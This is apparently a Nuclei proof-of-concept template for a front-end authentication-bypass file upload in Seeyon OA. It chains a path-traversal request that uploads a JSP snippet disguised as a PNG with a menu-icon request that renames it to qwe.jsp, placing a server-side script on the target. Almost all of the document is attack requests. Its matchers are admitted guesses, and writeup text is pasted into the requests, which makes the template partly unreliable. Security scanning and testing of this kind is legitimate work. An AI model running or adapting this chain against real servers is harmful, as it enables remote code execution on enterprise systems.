id: poc-isr8f9oln3aqf847
info:
  name: 致远互联-OA 前台fileUpload.do 绕过文件上传
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2024
http:
- raw:
  - 'POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1


    Host: {{Hostname}}


    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2


    Content-Type: multipart/form-data; boundary=00content0boundary00


    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)


    --00content0boundary00


    Content-Disposition: form-data; name="type"


    --00content0boundary00


    Content-Disposition: form-data; name="extensions"


    png


    --00content0boundary00


    Content-Disposition: form-data; name="applicationCategory"


    --00content0boundary00


    Content-Disposition: form-data; name="destDirectory"


    --00content0boundary00


    Content-Disposition: form-data; name="destFilename"


    --00content0boundary00


    Content-Disposition: form-data; name="maxSize"


    --00content0boundary00


    Content-Disposition: form-data; name="isEncrypt"


    false


    --00content0boundary00


    Content-Disposition: form-data; name="file1"; filename="1.png"


    Content-Type: Content-Type: application/pdf


    <% out.println("hello");%>


    --00content0boundary00--


    4、上传图片获取fileid值'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1


    Host: {{Hostname}}


    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2


    Content-type: application/x-www-form-urlencoded


    User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)


    method=uploadMenuIcon&fileid=获取到的值&filename=qwe.jsp


    1. 验证


    /seeyon/main/menuIcon/qwe.jsp


    ## 修复建议

    <font style="color:#333333;">1、请联系厂商进行修复或升级到安全版本。

    </font><font style="color:#333333;">2、如非必要，禁止公网访问该系统。

    </font>'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
